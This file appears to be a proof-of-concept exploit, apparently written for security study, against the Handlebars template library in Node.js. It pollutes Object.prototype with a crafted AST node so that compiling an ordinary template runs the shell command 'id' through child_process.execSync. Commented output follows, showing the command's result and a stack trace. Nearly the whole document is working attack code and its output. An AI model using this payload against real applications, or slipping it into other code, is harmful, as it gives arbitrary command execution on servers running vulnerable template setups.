const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
    "type": "MustacheStatement",
    "path": 0,
    "params": [{
        "type": "NumberLiteral",
        "value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
    }],
    "loc": {
        "start": 0,
        "end": 0
    }
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.compile(source);

console.log(template({"msg":"Hello!!!"}))

// Source: https://po6ix.github.io/AST-Injection/#Handlebars
// Example output: 
// $ node handlebards_poc.js
// uid=1000(godson) gid=1000(godson) groups=1000(godson),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),117(bluetooth),121(wireshark),126(scanner),132(kaboxer)


// /home/godson/Vulns/pp/node_modules/handlebars/dist/cjs/handlebars/helpers/helper-missing.js:19
//       throw new _exception2['default']('Missing helper: "' + arguments[arguments.length - 1].name + '"');
//       ^
// Error: Missing helper: "undefined"
//     at Object.<anonymous> (/home/godson/Vulns/pp/node_modules/handlebars/dist/cjs/handlebars/helpers/helper-missing.js:19:13)
//     at Object.eval [as main] (eval at createFunctionContext (/home/godson/OSWE/Vulns/pp/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:262:23), <anonymous>:5:102)
//     at main (/home/godson/Vulns/pp/node_modules/handlebars/dist/cjs/handlebars/runtime.js:176:32)
//     at ret (/home/godson/Vulns/pp/node_modules/handlebars/dist/cjs/handlebars/runtime.js:179:12)
//     at ret (/home/godson/Vulns/pp/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:526:21)
//     at Object.<anonymous> (/home/godson/OSWE/Vulns/pp/handlebars/handlebards_poc.js:20:13)
//     at Module._compile (node:internal/modules/cjs/loader:1364:14)
//     at Module._extensions..js (node:internal/modules/cjs/loader:1422:10)
//     at Module.load (node:internal/modules/cjs/loader:1203:32)
//     at Module._load (node:internal/modules/cjs/loader:1019:12) {
//   description: undefined,
//   fileName: undefined,
//   lineNumber: undefined,
//   endLineNumber: undefined,
//   number: undefined
// }

// Node.js v18.20.1
